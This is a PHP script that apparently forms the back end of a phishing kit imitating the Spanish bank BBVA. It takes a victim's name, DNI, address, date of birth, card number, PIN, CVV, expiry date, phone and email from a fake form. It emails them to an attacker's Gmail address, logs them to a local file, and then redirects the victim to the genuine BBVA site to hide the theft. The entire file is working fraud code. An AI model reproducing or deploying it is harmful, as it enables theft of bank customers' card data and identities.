<?

$dat3=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------BBVA Info-----------------------\n";
$message .= "Nombre : ".$_POST['lnombre']."\n";
$message .= "Apellido : ".$_POST['appellido']."\n";
$message .= "Direction : ".$_POST['directer']."\n";
$message .= "DNI : ".$_POST['dninr']."\n";
$message .= "Ciudad : ".$_POST['address']."\n";
$message .= "DOB : ".$_POST['fechanasc']."\n";
$message .= "--------------CC INFO---------------------\n";
$message .= "Tarjeta : ".$_POST['ctarje']."\n";
$message .= "Pin : ".$_POST['copin']."\n";
$message .= "Cvv : ".$_POST['cocvv']."\n";
$message .= "Expire date : ".$_POST['expdate']."\n";
$message .= "--------------Strange:))---------------------\n";
$message .= "Tel : ".$_POST['telAreaCode']."-".$_POST['telPrefix']."-".$_POST['telNumber']."\n";
$message .= "Mail: ".$_POST['emailAccount']."@".$_POST['emailDomain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$dat3."\n";


$recipient = "aqzwfx123@gmail.com";
$subject = "hola qtal chocholino";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$cc", "Bank Of America ReZulT (Thief)", $message);
$ff=fopen("xxx.txt","a");
fwrite($ff,$message);
fclose($ff);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.bbva.es/particulares/index.jsp");

}	
?>













